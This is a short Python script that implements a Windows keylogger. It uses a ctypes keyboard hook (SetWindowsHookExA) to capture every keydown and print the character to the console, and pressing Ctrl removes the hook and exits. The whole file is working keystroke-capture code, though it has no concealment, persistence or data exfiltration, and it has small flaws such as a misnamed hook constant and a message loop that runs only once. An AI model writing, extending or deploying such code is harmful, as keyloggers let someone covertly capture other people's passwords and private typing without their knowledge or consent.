# -*- coding: utf-8 -*-
import os
import sys
from ctypes import *
from ctypes.wintypes import *

"""
define constants
"""
WH_KEYBOARD = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162


class JHKeyLogger(object):

    def __init__(self, user32, kernel32):
        """
        Description:
            Init the keylogger object, the property 'hook_' is the handle to control our hook function

        Args:
            @(dll)user32: just put windll.user32 here
            @(dll)kernel32: just put windll.kernel32 here

        Returns:
            None
        """
        self.user32_ = user32
        self.kernel32_ = kernel32
        self.hook_ = None

    def install_hookproc(self, hookproc):
        """
        Description:
            install hookproc function into message chain

        Args:
            @(c type function)hookproc: hookproc is the hook function to call

        Returns:
            @(bool):
                if SetWindowHookExA() function works successfully, return True
                else return False
        """
        self.hook_ = self.user32_.SetWindowsHookExA(
            WH_KEYBOARD,
            hookproc,
            self.kernel32_.GetModuleHandleW(None),
            0)
        if not self.hook_:
            return False
        return True

    def uninstall_hookproc(self):
        """
        Description：
            uninstall the hookproc function which means pick the hookproc pointer off the message chain
        Args:
            None
        Returns:
            None
        """
        if not self.hook_:
            return
        self.user32_.UnhookWindowsHookEx(self.hook_)
        self.hook_ = None

    def start(self):
        """
        Description:
            start logging, just get the message, the current thread will blocked by the GetMessageA() function

        Args:
            None
        Returns:
            None
        """
        msg = MSG()
        self.user32_.GetMessageA(msg, 0, 0, 0)

    def stop(self):
        self.uninstall_hookproc()


def hookproc(nCode, wParam, lParam):
    """
    Description:
        An user-defined hook function

    Attention:
        here we use the global variable named 'g_keylogger'
    """
    if wParam != WM_KEYDOWN:
        return g_keylogger.user32_.CallNextHookEx(g_keylogger.hook_, nCode, wParam, lParam)

    pressed_key = chr(lParam[0])
    print(pressed_key)
    # hit ctrl key to stop logging
    if CTRL_CODE == lParam[0]:
        g_keylogger.stop()
        sys.exit(-1)
    return g_keylogger.user32_.CallNextHookEx(g_keylogger.hook_, nCode, wParam, lParam)


# Attention: pointer must be defined as a global variable
cfunctype = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
pointer = cfunctype(hookproc)

g_keylogger = JHKeyLogger(windll.user32, windll.kernel32)


def main():
    if g_keylogger.install_hookproc(pointer):
        print('install keylogger successfully!')

    g_keylogger.start()
    print('hit ctrl to stop')



if __name__ == '__main__':
    main()